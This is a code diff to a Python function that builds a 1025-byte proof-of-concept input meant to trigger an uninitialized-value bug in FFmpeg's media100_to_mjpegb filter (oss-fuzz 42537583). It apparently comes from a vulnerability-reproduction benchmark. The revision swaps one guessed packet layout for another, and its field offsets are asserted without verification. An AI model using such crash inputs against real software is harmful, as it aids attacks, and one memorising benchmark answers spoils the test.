@@ -2,26 +2,33 @@ import struct
 
 class Solution:
     def solve(self, src_path: str) -> bytes:
-        """
-        Generate a PoC for oss-fuzz:42537583 (media100_to_mjpegb uninitialized value).
-        The vulnerability allows reading uninitialized padding from the output buffer.
-        We construct a valid Media 100 packet of length 1025 to trigger the filter.
-        """
-        # Ground truth length is 1025
-        length = 1025
-        data = bytearray(length)
+        # The vulnerability is a Use-of-Uninitialized-Value in the bsf/media100_to_mjpegb module.
+        # It typically occurs when the output packet's padding is not cleared after allocation.
+        # To trigger this, we need to provide a valid Media100 packet that passes initial validation
+        # and proceeds to the conversion (and output allocation) stage.
         
-        # The media100_to_mjpegb filter reads a 32-bit big-endian integer at offset 4
-        # representing the offset to the second field ('next_off').
-        # We set this to 512, which is a valid offset within our 1025-byte buffer.
-        # This ensures the filter parses the packet as two fields and attempts to 
-        # construct an output packet, triggering the allocation/padding issue.
-        next_off = 512
-        struct.pack_into('>I', data, 4, next_off)
+        # Ground-truth PoC length is 1025 bytes.
+        # We use this length to ensure stability and match the testcase conditions.
+        poc_length = 1025
+        data = bytearray(poc_length)
         
-        # Fill the rest of the buffer with arbitrary data to simulate video content
-        # avoiding all-zeros which might be interpreted as empty/black frames
-        for i in range(12, length):
+        # The media100_to_mjpegb BSF reads 32-bit big-endian offsets from the input packet
+        # to locate the two interlaced fields.
+        # Offset for Field 1 is at index 8.
+        # Offset for Field 2 is at index 12.
+        
+        # We set Field 1 offset to 64 (after headers).
+        struct.pack_into('>I', data, 8, 64)
+        
+        # We set Field 2 offset to 512 (middle of the buffer).
+        # These offsets are strictly within the 1025 byte limit to pass bounds checks.
+        struct.pack_into('>I', data, 12, 512)
+        
+        # Fill the payload with a repeating pattern to simulate video data.
+        # Using a pattern (0-255) ensures we have non-zero data which might be required 
+        # for internal parsing or copying, while avoiding large blocks of zeros that 
+        # might be interpreted as padding or invalid data.
+        for i in range(16, poc_length):
             data[i] = i & 0xFF
             
         return bytes(data)
